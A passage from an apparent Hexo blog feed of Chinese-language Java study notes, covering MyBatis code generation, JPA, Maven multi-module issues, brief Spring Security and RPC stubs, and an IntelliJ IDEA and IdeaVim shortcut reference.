class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"mapper"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/resources"</span>&gt;</span><span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--??mapper???java??--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">"XMLMAPPER"</span> <span class="attr">targetPackage</span>=<span class="string">"com.example.springboot.dao"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/java"</span>&gt;</span><span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--??????(??tableName?domainObjectName)--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"book"</span> <span class="attr">domainObjectName</span>=<span class="string">"Book"</span> <span class="attr">enableCountByExample</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableDeleteByExample</span>=<span class="string">"true"</span> <span class="attr">enableUpdateByExample</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">selectByExampleQueryId</span>=<span class="string">"true"</span> <span class="attr">enableDeleteByPrimaryKey</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableSelectByPrimaryKey</span>=<span class="string">"true"</span> <span class="attr">enableSelectByExample</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并写Class 执行main方法进行 xml文件 导入和 使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybatisGenerator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generator</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ArrayList&lt;String&gt; warnings = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">boolean</span> overwrite = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//指定配置文件</span></span><br><span class="line">        File configFile = <span class="keyword">new</span> File(<span class="string">"generatorConfig.xml"</span>);</span><br><span class="line">        System.out.println(configFile.getAbsolutePath());</span><br><span class="line">        ConfigurationParser cp = <span class="keyword">new</span> ConfigurationParser(warnings);</span><br><span class="line">        Configuration config = cp.parseConfiguration(configFile);</span><br><span class="line">        DefaultShellCallback callback = <span class="keyword">new</span> DefaultShellCallback(overwrite);</span><br><span class="line">        MyBatisGenerator myBatisGenerator = <span class="keyword">new</span> MyBatisGenerator(config, callback, warnings);</span><br><span class="line">        myBatisGenerator.generate(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">for</span> (String warning : warnings) &#123;</span><br><span class="line">            System.out.println(warning);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MybatisGenerator mybatisGenerator = <span class="keyword">new</span> MybatisGenerator();</span><br><span class="line">        mybatisGenerator.generator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于jpa有个问题是 jpa中只需要在 dao层的接口内定义方法 ,jpa 中 extends 对应的类后就会自动实现基本的 查询等基础 sql操作 , 无法实现sql的优化 , 或者对表一些比较复杂的操作会涉及到效率问题 , </p><p>使用的是 @Entity 注解 将 实体类对象创建为表,  面向对象的思想, 将对象看作表进行实现</p><p>jpa 支持自定义SQL语句查询 , 官方文档 </p><p><img src="../images/java_web/image-20210428223748115.png" alt="image-20210428223748115"></p><p>@Query </p><p>spring中一些比较详细的东西 需要在docs  中查看 </p><p>对jpa可以使用xml 文件方式 ,使用命名空间 , </p><p>自定义命名空间属性 ,基于@Entity</p><p>对于JPA命名查询 </p><h4 id="官方query文档"><a href="#官方query文档" class="headerlink" title="官方query文档"></a><a href="https://docs.spring.io/spring-data/jpa/docs/1.10.2.RELEASE/reference/html/#jpa.query-methods.at-query" target="_blank" rel="noopener">官方query文档</a></h4><p>对表操作 </p><h3 id="多moudle中关于-relativePath"><a href="#多moudle中关于-relativePath" class="headerlink" title="多moudle中关于 relativePath"></a>多moudle中关于 relativePath</h3><p><img src="../images/java_web/image-20210429191614588.png" alt="image-20210429191614588"></p><p><relativePath> 中需要继承来自父moudle 的pom.xml文件 ,需要检验</p><h3 id="boot-多moudle-启动问题"><a href="#boot-多moudle-启动问题" class="headerlink" title="boot 多moudle 启动问题"></a>boot 多moudle 启动问题</h3><p>当依赖存在并可以被项目识别提示, 但运行时会报错不存在 , 找不到符号 ,</p><p>需要勾选 </p><p><img src="../images/java_web/image-20210429192036651.png" alt="image-20210429192036651"></p><h4 id="子模块互相引用"><a href="#子模块互相引用" class="headerlink" title="子模块互相引用"></a>子模块互相引用</h4><p><img src="../images/java_web/image-20210429232630567.png" alt="image-20210429232630567"></p><p>需要在一个子moudle中进行 另一个子模块依赖的引入, 而不能在 父级pom 中引入, 因为这样被依赖模块本身会依赖自己 ,进行 重构在另一个moudle 中引入依赖 </p><p>在加上这个</p><p><img src="../images/java_web/image-20210429232946672.png" alt="image-20210429232946672"></p><p>在父项目下的maven-plugin 中写入 ,运行 </p><p>mvn clean package  , 相当于clean后重新打包, </p><p><img src="../images/java_web/image-20210429233031551.png" alt="image-20210429233031551"></p><p>此时会有两个jar</p><p><img src="../images/java_web/image-20210430152728623.png" alt="image-20210430152728623"></p><p>maven 中会加入 moudle 的依赖包</p><h4 id="子moudle-a中使用另一个moudle-b的bean-出现-error-creating"><a href="#子moudle-a中使用另一个moudle-b的bean-出现-error-creating" class="headerlink" title="子moudle a中使用另一个moudle b的bean 出现 error  creating"></a>子moudle a中使用另一个moudle b的bean 出现 error  creating</h4><p>因为moudle a 扫描不到  moudle下的包 , 加上 CpmponentScan 扫描 </p><p><img src="../images/java_web/image-20210430120148307.png" alt="image-20210430120148307"></p><p>“{ }” 可以扫描多个package , 用”,”隔开 </p><h4 id="子moudle-a-在controller层调用-service-实现报错"><a href="#子moudle-a-在controller层调用-service-实现报错" class="headerlink" title="子moudle a 在controller层调用 service 实现报错"></a>子moudle a 在controller层调用 service 实现报错</h4><p><img src="../images/java_web/image-20210430152835803.png" alt="image-20210430152835803"></p><p>service</p><p><img src="../images/java_web/image-20210430152937772.png" alt="image-20210430152937772"></p><p>CustomerRepisutory调用的为子moudle b 中的 repo 文件 </p><p>cotroller</p><p><img src="../images/java_web/image-20210430153023238.png" alt="image-20210430153023238"></p><p>最后找到原因为依赖的子moudle b在 运行 applcation时报错, 报错的刚好为 moudle a 所引用的类</p><p>将 moudle b中的错误修正后 ,在 moudle a 中编写正确的程序  </p><p><em><img src="../images/java_web/image-20210430160525751.png" alt="image-20210430160525751"></em></p><h3 id="依赖重复"><a href="#依赖重复" class="headerlink" title="依赖重复"></a>依赖重复</h3><p>不小心在一个moudle中添加了spring框架 ,因为已经有了springboot, 导致以来重复,在</p><p><img src="../images/java_web/image-20210501102240688.png" alt="image-20210501102240688"></p><p>删除就ok</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/java_Security</title>
      <link href="java/java_Security/"/>
      <url>java/java_Security/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringSecurity-结合springboot"><a href="#SpringSecurity-结合springboot" class="headerlink" title="SpringSecurity 结合springboot"></a>SpringSecurity 结合springboot</h1><a id="more"></a><p>springSecutrity会对web页面进行限制 , 在查看web界面的时候需要登陆 ,默认 用户名为user 密码在控制台上随机生成 </p><p>可以在sringboot中自己配置</p><h2 id="权限处理"><a href="#权限处理" class="headerlink" title="权限处理"></a>权限处理</h2><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/java_rpc</title>
      <link href="java/java_rpc/"/>
      <url>java/java_rpc/</url>
      
        <content type="html"><![CDATA[<h1 id="简易rpc框架"><a href="#简易rpc框架" class="headerlink" title="简易rpc框架"></a>简易rpc框架</h1><p>跟着教程造一个简易轮子</p><a id="more"></a> <p>RPC, Remote Procedur0e Call ,远程过程调用, 它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。它可以有不同的实现方式。如RMI(远程方法调用)、Hessian、Http invoker等。另外，RPC是与语言无关的。</p><p>允许一台计算机调用另一台计算机上的程序得到结果, 代码中不需要额外的编程, 像在本地调用一样</p><p>分布式的应用可以借助RPC来完成 机器之间的调用 </p><h2 id="RPC框架原理"><a href="#RPC框架原理" class="headerlink" title="RPC框架原理"></a><strong>RPC框架原理</strong></h2><p>在RPC框架中主要有三个角色：Provider、Consumer和Registry。如下图所示：<br><img src="../../../%25E7%25BC%2596%25E7%25A8%258B/images/java_temp_writ/137084-20180506151205222-740014430.png" alt="img"></p><p>节点角色说明：<br>* Server: 暴露服务的服务提供方。<br>* Client: 调用远程服务的服务消费方。<br>* Registry: 服务注册与发现的注册中心。</p><p><img src="../images/java_rpc/522490-20151003120412386-363334260.png" alt="img"></p><p>即将开始记录 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/idea</title>
      <link href="java/idea/"/>
      <url>java/idea/</url>
      
        <content type="html"><![CDATA[<h1 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h1><a id="more"></a><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><h3 id="1-Ctrl"><a href="#1-Ctrl" class="headerlink" title="1.Ctrl"></a>1.Ctrl</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + F</td><td>在当前文件进行文本查找 （必备）</td></tr><tr><td>Ctrl + R</td><td>在当前文件进行文本替换 （必备）</td></tr><tr><td>Ctrl + Z</td><td>撤销 （必备）</td></tr><tr><td>Ctrl + Y</td><td>删除光标所在行 或 删除选中的行 （必备）</td></tr><tr><td>Ctrl + X</td><td>剪切光标所在行 或 剪切选择内容</td></tr><tr><td>Ctrl + C</td><td>复制光标所在行 或 复制选择内容</td></tr><tr><td>Ctrl + D</td><td>复制光标所在行 或 复制选择内容，并把复制内容插入光标位置下面 （必备）</td></tr><tr><td>Ctrl + W</td><td>递进式选择代码块。可选中光标所在的单词或段落，连续按会在原有选中的基础上再扩展选中范围 （必备）</td></tr><tr><td>Ctrl + E</td><td>显示最近打开的文件记录列表 （必备）</td></tr><tr><td>Ctrl + N</td><td>根据输入的 <strong>类名</strong> 查找类文件 （必备）</td></tr><tr><td>Ctrl + G</td><td>在当前文件跳转到指定行处</td></tr><tr><td>Ctrl + J</td><td>插入自定义动态代码模板 （必备）</td></tr><tr><td>Ctrl + P</td><td>方法参数提示显示 （必备）</td></tr><tr><td>Ctrl + Q</td><td>光标所在的变量 / 类名 / 方法名等上面（也可以在提示补充的时候按），显示文档内容</td></tr><tr><td>Ctrl + U</td><td>前往当前光标所在的方法的父类的方法 / 接口定义 （必备）</td></tr><tr><td>Ctrl + B</td><td>进入光标所在的方法/变量的接口或是定义处，等效于 Ctrl + 左键单击 （必备）</td></tr><tr><td>Ctrl + K</td><td>版本控制提交项目，需要此项目有加入到版本控制才可用</td></tr><tr><td>Ctrl + T</td><td>版本控制更新项目，需要此项目有加入到版本控制才可用</td></tr><tr><td>Ctrl + H</td><td>显示当前类的层次结构</td></tr><tr><td>Ctrl + O</td><td>选择可重写的方法</td></tr><tr><td>Ctrl + I</td><td>选择可继承的方法</td></tr><tr><td>Ctrl + +</td><td>展开代码</td></tr><tr><td>Ctrl + -</td><td>折叠代码</td></tr><tr><td>Ctrl + /</td><td>注释光标所在行代码，会根据当前不同文件类型使用不同的注释符号 （必备）</td></tr><tr><td>Ctrl + [</td><td>移动光标到当前所在代码的花括号开始位置</td></tr><tr><td>Ctrl + ]</td><td>移动光标到当前所在代码的花括号结束位置</td></tr><tr><td>Ctrl + F1</td><td>在光标所在的错误代码处显示错误信息 （必备）</td></tr><tr><td>Ctrl + F3</td><td>调转到所选中的词的下一个引用位置 （必备）</td></tr><tr><td>Ctrl + F4</td><td>关闭当前编辑文件</td></tr><tr><td>Ctrl + F8</td><td>在 Debug 模式下，设置光标当前行为断点，如果当前已经是断点则去掉断点</td></tr><tr><td>Ctrl + F9</td><td>执行 Make Project 操作</td></tr><tr><td>Ctrl + F11</td><td>选中文件 / 文件夹，使用助记符设定 / 取消书签 （必备）</td></tr><tr><td>Ctrl + F12</td><td>弹出当前文件结构层，可以在弹出的层上直接输入，进行筛选</td></tr><tr><td>Ctrl + Tab</td><td>编辑窗口切换，如果在切换的过程又加按上delete，则是关闭对应选中的窗口</td></tr><tr><td>Ctrl + End</td><td>跳到文件尾</td></tr><tr><td>Ctrl + Home</td><td>跳到文件头</td></tr><tr><td>Ctrl + Space</td><td>基础代码补全，默认在 Windows 系统上被输入法占用，需要进行修改，建议修改为 Ctrl + 逗号 （必备）</td></tr><tr><td>Ctrl + Delete</td><td>删除光标后面的单词或是中文句 （必备）</td></tr><tr><td>Ctrl + BackSpace</td><td>删除光标前面的单词或是中文句 （必备）</td></tr><tr><td>Ctrl + 1,2,3…9</td><td>定位到对应数值的书签位置 （必备）</td></tr><tr><td>Ctrl + 左键单击</td><td>在打开的文件标题上，弹出该文件路径 （必备）</td></tr><tr><td>Ctrl + 光标定位</td><td>按 Ctrl 不要松开，会显示光标所在的类信息摘要</td></tr><tr><td>Ctrl + 左方向键</td><td>光标跳转到当前单词 / 中文句的左侧开头位置 （必备）</td></tr><tr><td>Ctrl + 右方向键</td><td>光标跳转到当前单词 / 中文句的右侧开头位置 （必备）</td></tr><tr><td>Ctrl + 前方向键</td><td>等效于鼠标滚轮向前效果 （必备）</td></tr><tr><td>Ctrl + 后方向键</td><td>等效于鼠标滚轮向后效果 （必备）</td></tr></tbody></table><h3 id="2-Alt"><a href="#2-Alt" class="headerlink" title="2.Alt"></a>2.Alt</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Alt + `|显示版本控制常用操作菜单弹出层 （必备）</td><td></td></tr><tr><td>Alt + Q</td><td>弹出一个提示，显示当前类的声明 / 上下文信息</td></tr><tr><td>Alt + F1</td><td>显示当前文件选择目标弹出层，弹出层中有很多目标可以进行选择 （必备）</td></tr><tr><td>Alt + F2</td><td>对于前面页面，显示各类浏览器打开目标选择弹出层</td></tr><tr><td>Alt + F3</td><td>选中文本，逐个往下查找相同文本，并高亮显示</td></tr><tr><td>Alt + F7</td><td>查找光标所在的方法 / 变量 / 类被调用的地方</td></tr><tr><td>Alt + F8</td><td>在 Debug 的状态下，选中对象，弹出可输入计算表达式调试框，查看该输入内容的调试结果</td></tr><tr><td>Alt + Home</td><td>定位 / 显示到当前文件的 Navigation Bar</td></tr><tr><td>Alt + Enter</td><td>IntelliJ IDEA 根据光标所在问题，提供快速修复选择，光标放在的位置不同提示的结果也不同 （必备）</td></tr><tr><td>Alt + Insert</td><td>代码自动生成，如生成对象的 set / get 方法，构造函数，toString() 等 （必备）</td></tr><tr><td>Alt + 左方向键</td><td>切换当前已打开的窗口中的子视图，比如Debug窗口中有Output、Debugger等子视图，用此快捷键就可以在子视图中切换 （必备）</td></tr><tr><td>Alt + 右方向键</td><td>按切换当前已打开的窗口中的子视图，比如Debug窗口中有Output、Debugger等子视图，用此快捷键就可以在子视图中切换 （必备）</td></tr><tr><td>Alt + 前方向键</td><td>当前光标跳转到当前文件的前一个方法名位置 （必备）</td></tr><tr><td>Alt + 后方向键</td><td>当前光标跳转到当前文件的后一个方法名位置 （必备）</td></tr><tr><td>Alt + 1,2,3…9</td><td>显示对应数值的选项卡，其中 1 是 Project 用得最多 （必备）</td></tr></tbody></table><h3 id="3-Shift"><a href="#3-Shift" class="headerlink" title="3.Shift"></a>3.Shift</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Shift + F1</td><td>如果有外部文档可以连接外部文档</td></tr><tr><td>Shift + F2</td><td>跳转到上一个高亮错误 或 警告位置</td></tr><tr><td>Shift + F3</td><td>在查找模式下，查找匹配上一个</td></tr><tr><td>Shift + F4</td><td>对当前打开的文件，使用新Windows窗口打开，旧窗口保留</td></tr><tr><td>Shift + F6</td><td>对文件 / 文件夹 重命名</td></tr><tr><td>Shift + F7</td><td>在 Debug 模式下，智能步入。断点所在行上有多个方法调用，会弹出进入哪个方法</td></tr><tr><td>Shift + F8</td><td>在 Debug 模式下，跳出，表现出来的效果跟 F9 一样</td></tr><tr><td>Shift + F9</td><td>等效于点击工具栏的 Debug 按钮</td></tr><tr><td>Shift + F10</td><td>等效于点击工具栏的 Run 按钮</td></tr><tr><td>Shift + F11</td><td>弹出书签显示层 （必备）</td></tr><tr><td>Shift + Tab</td><td>取消缩进 （必备）</td></tr><tr><td>Shift + ESC</td><td>隐藏当前 或 最后一个激活的工具窗口</td></tr><tr><td>Shift + End</td><td>选中光标到当前行尾位置</td></tr><tr><td>Shift + Home</td><td>选中光标到当前行头位置</td></tr><tr><td>Shift + Enter</td><td>开始新一行。光标所在行下空出一行，光标定位到新行位置 （必备）</td></tr><tr><td>Shift + 左键单击</td><td>在打开的文件名上按此快捷键，可以关闭当前打开文件 （必备）</td></tr><tr><td>Shift + 滚轮前后滚动</td><td>当前文件的横向滚动轴滚动 （必备）</td></tr></tbody></table><h3 id="4-Ctrl-Alt"><a href="#4-Ctrl-Alt" class="headerlink" title="4.Ctrl + Alt"></a>4.Ctrl + Alt</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + Alt + L</td><td>格式化代码，可以对当前文件和整个包目录使用 （必备）</td></tr><tr><td>Ctrl + Alt + O</td><td>优化导入的类，可以对当前文件和整个包目录使用 （必备）</td></tr><tr><td>Ctrl + Alt + I</td><td>光标所在行 或 选中部分进行自动代码缩进，有点类似格式化</td></tr><tr><td>Ctrl + Alt + T</td><td>对选中的代码弹出环绕选项弹出层 （必备）</td></tr><tr><td>Ctrl + Alt + J</td><td>弹出模板选择窗口，将选定的代码加入动态模板中</td></tr><tr><td>Ctrl + Alt + H</td><td>调用层次</td></tr><tr><td>Ctrl + Alt + B</td><td>在某个调用的方法名上使用会跳到具体的实现处，可以跳过接口</td></tr><tr><td>Ctrl + Alt + C</td><td>重构-快速提取常量</td></tr><tr><td>Ctrl + Alt + F</td><td>重构-快速提取成员变量</td></tr><tr><td>Ctrl + Alt + V</td><td>重构-快速提取变量</td></tr><tr><td>Ctrl + Alt + Y</td><td>同步、刷新</td></tr><tr><td>Ctrl + Alt + S</td><td>打开 IntelliJ IDEA 系统设置 （必备）</td></tr><tr><td>Ctrl + Alt + F7</td><td>显示使用的地方。寻找被该类或是变量被调用的地方，用弹出框的方式找出来</td></tr><tr><td>Ctrl + Alt + F11</td><td>切换全屏模式</td></tr><tr><td>Ctrl + Alt + Enter</td><td>光标所在行上空出一行，光标定位到新行 （必备）</td></tr><tr><td>Ctrl + Alt + Home</td><td>弹出跟当前文件有关联的文件弹出层</td></tr><tr><td>Ctrl + Alt + Space</td><td>类名自动完成</td></tr><tr><td>Ctrl + Alt + 左方向键</td><td>退回到上一个操作的地方 （必备）</td></tr><tr><td>Ctrl + Alt + 右方向键</td><td>前进到上一个操作的地方 （必备）</td></tr><tr><td>Ctrl + Alt + 前方向键</td><td>在查找模式下，跳到上个查找的文件</td></tr><tr><td>Ctrl + Alt + 后方向键</td><td>在查找模式下，跳到下个查找的文件</td></tr><tr><td>Ctrl + Alt + 右括号（]）</td><td>在打开多个项目的情况下，切换下一个项目窗口</td></tr><tr><td>Ctrl + Alt + 左括号（[）</td><td>在打开多个项目的情况下，切换上一个项目窗口</td></tr></tbody></table><h3 id="5-Ctrl-Shift"><a href="#5-Ctrl-Shift" class="headerlink" title="5.Ctrl + Shift"></a>5.Ctrl + Shift</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + Shift + F</td><td>根据输入内容查找整个项目 或 指定目录内文件 （必备）</td></tr><tr><td>Ctrl + Shift + R</td><td>根据输入内容替换对应内容，范围为整个项目 或 指定目录内文件 （必备）</td></tr><tr><td>Ctrl + Shift + J</td><td>自动将下一行合并到当前行末尾 （必备）</td></tr><tr><td>Ctrl + Shift + Z</td><td>取消撤销 （必备）</td></tr><tr><td>Ctrl + Shift + W</td><td>递进式取消选择代码块。可选中光标所在的单词或段落，连续按会在原有选中的基础上再扩展取消选中范围 （必备）</td></tr><tr><td>Ctrl + Shift + N</td><td>通过文件名定位 / 打开文件 / 目录，打开目录需要在输入的内容后面多加一个正斜杠 （必备）</td></tr><tr><td>Ctrl + Shift + U</td><td>对选中的代码进行大 / 小写轮流转换 （必备）</td></tr><tr><td>Ctrl + Shift + T</td><td>对当前类生成单元测试类，如果已经存在的单元测试类则可以进行选择 （必备）</td></tr><tr><td>Ctrl + Shift + C</td><td>复制当前文件磁盘路径到剪贴板 （必备）</td></tr><tr><td>Ctrl + Shift + V</td><td>弹出缓存的最近拷贝的内容管理器弹出层</td></tr><tr><td>Ctrl + Shift + E</td><td>显示最近修改的文件列表的弹出层</td></tr><tr><td>Ctrl + Shift + H</td><td>显示方法层次结构</td></tr><tr><td>Ctrl + Shift + B</td><td>跳转到类型声明处 （必备）</td></tr><tr><td>Ctrl + Shift + I</td><td>快速查看光标所在的方法 或 类的定义</td></tr><tr><td>Ctrl + Shift + A</td><td>查找动作 / 设置</td></tr><tr><td>Ctrl + Shift + /</td><td>代码块注释 （必备）</td></tr><tr><td>Ctrl + Shift + [</td><td>选中从光标所在位置到它的顶部中括号位置 （必备）</td></tr><tr><td>Ctrl + Shift + ]</td><td>选中从光标所在位置到它的底部中括号位置 （必备）</td></tr><tr><td>Ctrl + Shift + +</td><td>展开所有代码 （必备）</td></tr><tr><td>Ctrl + Shift + -</td><td>折叠所有代码 （必备）</td></tr><tr><td>Ctrl + Shift + F7</td><td>高亮显示所有该选中文本，按Esc高亮消失 （必备）</td></tr><tr><td>Ctrl + Shift + F8</td><td>在 Debug 模式下，指定断点进入条件</td></tr><tr><td>Ctrl + Shift + F9</td><td>编译选中的文件 / 包 / Module</td></tr><tr><td>Ctrl + Shift + F12</td><td>编辑器最大化 （必备）</td></tr><tr><td>Ctrl + Shift + Space</td><td>智能代码提示</td></tr><tr><td>Ctrl + Shift + Enter</td><td>自动结束代码，行末自动添加分号 （必备）</td></tr><tr><td>Ctrl + Shift + Backspace</td><td>退回到上次修改的地方 （必备）</td></tr><tr><td>Ctrl + Shift + 1,2,3…9</td><td>快速添加指定数值的书签 （必备）</td></tr><tr><td>Ctrl + Shift + 左键单击</td><td>把光标放在某个类变量上，按此快捷键可以直接定位到该类中 （必备）</td></tr><tr><td>Ctrl + Shift + 左方向键</td><td>在代码文件上，光标跳转到当前单词 / 中文句的左侧开头位置，同时选中该单词 / 中文句 （必备）</td></tr><tr><td>Ctrl + Shift + 右方向键</td><td>在代码文件上，光标跳转到当前单词 / 中文句的右侧开头位置，同时选中该单词 / 中文句 （必备）</td></tr><tr><td>Ctrl + Shift + 前方向键</td><td>光标放在方法名上，将方法移动到上一个方法前面，调整方法排序 （必备）</td></tr><tr><td>Ctrl + Shift + 后方向键</td><td>光标放在方法名上，将方法移动到下一个方法前面，调整方法排序 （必备）</td></tr></tbody></table><h3 id="6-Alt-Shift"><a href="#6-Alt-Shift" class="headerlink" title="6.Alt + Shift"></a>6.Alt + Shift</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Alt + Shift + N</td><td>选择 / 添加 task （必备）</td></tr><tr><td>Alt + Shift + F</td><td>显示添加到收藏夹弹出层 / 添加到收藏夹</td></tr><tr><td>Alt + Shift + C</td><td>查看最近操作项目的变化情况列表</td></tr><tr><td>Alt + Shift + I</td><td>查看项目当前文件</td></tr><tr><td>Alt + Shift + F7</td><td>在 Debug 模式下，下一步，进入当前方法体内，如果方法体还有方法，则会进入该内嵌的方法中，依此循环进入</td></tr><tr><td>Alt + Shift + F9</td><td>弹出 Debug 的可选择菜单</td></tr><tr><td>Alt + Shift + F10</td><td>弹出 Run 的可选择菜单</td></tr><tr><td>Alt + Shift + 左键双击</td><td>选择被双击的单词 / 中文句，按住不放，可以同时选择其他单词 / 中文句 （必备）</td></tr><tr><td>Alt + Shift + 前方向键</td><td>移动光标所在行向上移动 （必备）</td></tr><tr><td>Alt + Shift + 后方向键</td><td>移动光标所在行向下移动 （必备）</td></tr></tbody></table><h3 id="7-Ctrl-Shift-Alt"><a href="#7-Ctrl-Shift-Alt" class="headerlink" title="7.Ctrl + Shift + Alt"></a>7.Ctrl + Shift + Alt</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + Shift + Alt + V</td><td>无格式黏贴 （必备）</td></tr><tr><td>Ctrl + Shift + Alt + N</td><td>前往指定的变量 / 方法</td></tr><tr><td>Ctrl + Shift + Alt + S</td><td>打开当前项目设置 （必备）</td></tr><tr><td>Ctrl + Shift + Alt + C</td><td>复制参考信息</td></tr></tbody></table><h3 id="8-其他"><a href="#8-其他" class="headerlink" title="8.其他"></a>8.其他</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>F2</td><td>跳转到下一个高亮错误 或 警告位置 （必备）</td></tr><tr><td>F3</td><td>在查找模式下，定位到下一个匹配处</td></tr><tr><td>F4</td><td>编辑源 （必备）</td></tr><tr><td>F7</td><td>在 Debug 模式下，进入下一步，如果当前行断点是一个方法，则进入当前方法体内，如果该方法体还有方法，则不会进入该内嵌的方法中</td></tr><tr><td>F8</td><td>在 Debug 模式下，进入下一步，如果当前行断点是一个方法，则不进入当前方法体内</td></tr><tr><td>F9</td><td>在 Debug 模式下，恢复程序运行，但是如果该断点下面代码还有断点则停在下一个断点上</td></tr><tr><td>F11</td><td>添加书签 （必备）</td></tr><tr><td>F12</td><td>回到前一个工具窗口 （必备）</td></tr><tr><td>Tab</td><td>缩进 （必备）</td></tr><tr><td>ESC</td><td>从工具窗口进入代码文件窗口 （必备）</td></tr><tr><td>连按两次Shift</td><td>弹出 Search Everywhere 弹出层</td></tr></tbody></table><p>ctrl+shift+enter  Complete Current Statement </p><p>自动关闭并跳下一行</p><p>shift+enter 光标位置下重开一行</p><p>ctrl+shift+m 移动到光标位置</p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><h3 id="ideaVim"><a href="#ideaVim" class="headerlink" title="ideaVim"></a>ideaVim</h3><pre><code>IdeaVim               o               |          i&lt;--当前光标--&gt;a</code></pre><p>I&lt;—————   |    —————————-&gt;A<br>                    O<br>    上k 下j 左h 右l</p><pre><code>w(小写) -&gt; 词组正向跳转到下一个单词开始 (以空格和符号作为分隔)W(大写) -&gt; 词组正向跳转到下一个单词开始 (以空格作为分隔)e(小写) -&gt; 词组正向跳转到下一个单词结尾 (以空格和符号作为分隔)E(大写) -&gt; 词组正向跳转到下一个单词结尾 (以空格作为分隔)b(小写) -&gt; 词组反向跳转(以空格和符号作为分隔)B(大写) -&gt; 词组反向跳转(以空格作为分隔)f(小写)+指定字符 -&gt; 正向跳转至指定字符F(大写)+指定字符 -&gt; 反向跳转至指定字符t(小写)+指定字符 -&gt; 正向跳转指定字符的上一个位置(空格也算)T(大写)+指定字符 -&gt; 反向跳转指定字符的下一个位置(空格也算)yy -&gt; 复制当前行p -&gt; 在光标所在位置向下新开辟一行,粘贴yyp -&gt; 当前行复制并粘贴10p -&gt; 粘贴10次v -&gt; 选中当前光标(再通过上下左右kjhl进行区域选中)V(大写) -&gt; 选中当前光标所在行(再通过上下左右kjhl进行区域选中)dd -&gt; 删除当前行5dd -&gt; 删除当前行在内的以下的5行d -&gt; 删除选中的区域  例如vjjd进行区域的删除u -&gt; 撤销ctrl+r -&gt; 反撤销 idea内暂时不支持x(小写) -&gt; 正向按字符单位进行删除 向右删除X(大写) -&gt; 反向按字符单位进行删除 向做删除df+指定字符 -&gt; 从光标处删除至指定字符di&quot; -&gt; 删除引号内的内容da&quot; -&gt; 删除包括引号在内的内容gg -&gt; 跳转至文件头G -&gt; 跳转至文件尾行号+G -&gt; 跳转到指定行的开头(:N 到第N行，如 :137 到第137行):wq -&gt; 存盘+退出 (:w 存盘, :q 退出)(:w 后可以跟文件名)cw -&gt; 替换从光标所在位置后到一个单词结尾的字符0(数字0) -&gt; 到行头^ -&gt; 到本行第一个不是blank字符的位置（所谓blank字符就是空格，tab，换行，回车等）$ -&gt; 到本行行尾g_ 